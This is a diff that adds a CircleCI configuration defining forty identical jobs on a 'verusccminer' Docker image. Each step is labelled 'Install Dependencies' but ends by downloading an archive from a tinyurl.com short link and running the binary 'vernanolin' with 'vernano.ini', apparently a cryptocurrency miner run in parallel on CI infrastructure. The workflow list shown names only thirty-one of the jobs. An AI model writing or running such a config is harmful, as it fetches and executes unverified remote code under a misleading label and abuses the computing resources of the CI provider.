@@ -1,0 +1,767 @@
+version: 2.1
+jobs:
+    aku1:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku2:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku3:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku4:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku5:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku6:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku7:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku8:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku9:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku10:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku11:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku12:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku13:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku14:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku15:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku16:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku17:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku18:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku19:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku20:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku21:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku22:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku23:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku24:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku25:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku26:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku27:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku28:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku29:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku30:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku31:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku32:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku33:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku34:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku35:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku36:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku37:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku38:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku39:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    aku40:
+      docker:
+            - image: wattpool/verusccminer
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              apt update && apt upgrade -y \
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt-get update && apt-get dist-upgrade -y \
+              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
+              apt-get clean && \
+              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+              apt install wget -y
+              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - aku1
+            - aku2
+            - aku3
+            - aku4
+            - aku5
+            - aku6
+            - aku7
+            - aku8
+            - aku9
+            - aku10
+            - aku11
+            - aku12
+            - aku13
+            - aku14
+            - aku15
+            - aku16
+            - aku17
+            - aku18
+            - aku19
+            - aku20
+            - aku21
+            - aku22
+            - aku23
+            - aku24
+            - aku25
+            - aku26
+            - aku27
+            - aku28
+            - aku29
+            - aku30
+            - aku31
